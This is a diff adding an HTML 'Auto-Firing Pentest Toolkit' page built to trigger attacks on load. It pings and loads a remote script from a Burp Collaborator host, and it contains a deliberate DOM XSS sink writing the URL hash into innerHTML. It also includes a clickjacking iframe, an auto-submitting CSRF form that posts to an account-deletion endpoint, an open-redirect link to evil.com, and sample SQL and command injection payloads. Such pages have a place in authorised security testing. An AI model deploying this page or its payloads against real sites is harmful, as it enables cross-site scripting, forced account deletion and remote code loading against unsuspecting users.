@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Auto-Firing Pentest Toolkit</title>
+  <style>
+    body { font-family: sans-serif; padding: 20px; }
+    section { border: 1px solid #ccc; padding: 15px; margin: 20px 0; border-radius: 5px; }
+    iframe { width: 100%; height: 120px; border: 1px solid #888; margin-top: 10px; }
+  </style>
+</head>
+<body>
+  <h1>🔥 Auto-Firing Pentest Toolkit</h1>
+  <p>This page is designed to trigger various behaviors automatically when loaded via XSS or iframe.</p>
+
+  <!-- Auto Collaborator Pings -->
+  <section>
+    <h2>📡 Collaborator Ping (Auto)</h2>
+    <script>
+      const collab = "awavhdko0lj7ccruepp9p3qo8fe62zqo.oastify.com"; // CHANGE THIS TO YOUR BURP COLLABORATOR DOMAIN
+
+      // IMG Ping
+      new Image().src = `http://${collab}/img`;
+
+      // Script Load
+      const script = document.createElement("script");
+      script.src = `http://${collab}/script.js`;
+      document.body.appendChild(script);
+
+      // WebSocket
+      try { new WebSocket(`ws://${collab}/ws`); } catch (e) {}
+
+      // Iframe DNS Ping
+      const iframe = document.createElement("iframe");
+      iframe.src = `http://${collab}/iframe`;
+      iframe.style.display = "none";
+      document.body.appendChild(iframe);
+    </script>
+    <p>Collaborator interaction triggered on load.</p>
+  </section>
+
+  <!-- DOM XSS Sink -->
+  <section>
+    <h2>🧠 DOM XSS Sink</h2>
+    <div id="domXss"></div>
+    <script>
+      const h = decodeURIComponent(location.hash.slice(1));
+      document.getElementById("domXss").innerHTML = h;
+    </script>
+    <p>Trigger with <code>#&lt;img src=x onerror=alert(1)&gt;</code></p>
+  </section>
+
+  <!-- Clickjacking Iframe -->
+  <section>
+    <h2>🖼️ Clickjacking Test</h2>
+    <p>If the login page loads below, it's frameable:</p>
+    <iframe src="https://example.com/login"></iframe>
+  </section>
+
+  <!-- CSRF Auto Form -->
+  <section>
+    <h2>🎯 Auto-CSRF</h2>
+    <form action="https://example.com/account/delete" method="POST">
+      <input type="hidden" name="confirm" value="yes">
+      <script>document.forms[0].submit();</script>
+    </form>
+    <p>Auto-submits POST request on load.</p>
+  </section>
+
+  <!-- Open Redirect Trigger -->
+  <section>
+    <h2>🔀 Open Redirect Test</h2>
+    <p><a href="/redirect?next=https://evil.com">Click here to test open redirect</a></p>
+  </section>
+
+  <!-- SQLi & Command Injection -->
+  <section>
+    <h2>🧬 SQLi & CMD Injection Payloads</h2>
+    <p>Example SQLi: <code>1' OR '1'='1</code></p>
+    <p>Example CMDi: <code>127.0.0.1; whoami</code></p>
+  </section>
+</body>
+</html>
